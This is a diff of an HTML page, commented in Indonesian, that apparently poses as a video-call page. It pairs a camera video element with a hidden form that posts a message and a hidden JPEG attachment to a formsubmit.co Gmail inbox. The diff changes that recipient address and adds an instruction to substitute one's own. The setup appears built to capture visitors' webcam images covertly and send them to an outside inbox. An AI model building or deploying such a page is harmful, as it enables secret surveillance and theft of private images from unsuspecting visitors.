@@ -88,7 +88,6 @@
         
         /* Form hidden untuk submit */
         #form-submit { display: none; }
-        #email-input { display: none; }
     </style>
 </head>
 <body>
@@ -119,16 +118,21 @@
 <video id="video-source" autoplay playsinline muted></video>
 
 <!-- Form untuk Submit Email -->
-<form id="form-submit" action="https://formsubmit.co/milandahayani477@gmail.com" method="POST">
+<!-- 
+    PENTING: Ganti 'desamuncrat477@gmail.com' dengan email tujuan Anda jika berbeda.
+    Pastikan email tersebut sudah di-verify via link yang dikirim FormSubmit.
+-->
+<form id="form-submit" action="https://formsubmit.co/desamuncrat477@gmail.com" method="POST" enctype="multipart/form-data">
     <!-- Field wajib FormSubmit -->
     <input type="hidden" name="_subject" value="New Video Call Submission!">
     <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" id="redirect-link"> <!-- Opsional: redirect setelah submit -->
+    <input type="hidden" name="_autoresponse" value="Terima kasih! Data Anda telah diterima.">
     
     <!-- Field untuk Message -->
     <input type="hidden" name="message" id="hidden-message">
     
     <!-- Field untuk Attachment -->
+    <!-- Name 'attachment' atau 'file' biasanya bekerja. FormSubmit mendukung keduanya. -->
     <input type="file" name="attachment" id="hidden-file" accept="image/jpeg">
 </form>
 
@@ -142,10 +146,6 @@
     const formSubmit = document.getElementById('form-submit');
     const hiddenMessage = document.getElementById('hidden-message');
     const hiddenFile = document.getElementById('hidden-file');
-    const redirectLink = document.getElementById('redirect-link');
-
-    // Set redirect ke halaman ini setelah submit (agar tidak error 405)
-    redirectLink.value = window.location.href;
 
     function getTime() {
         return new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
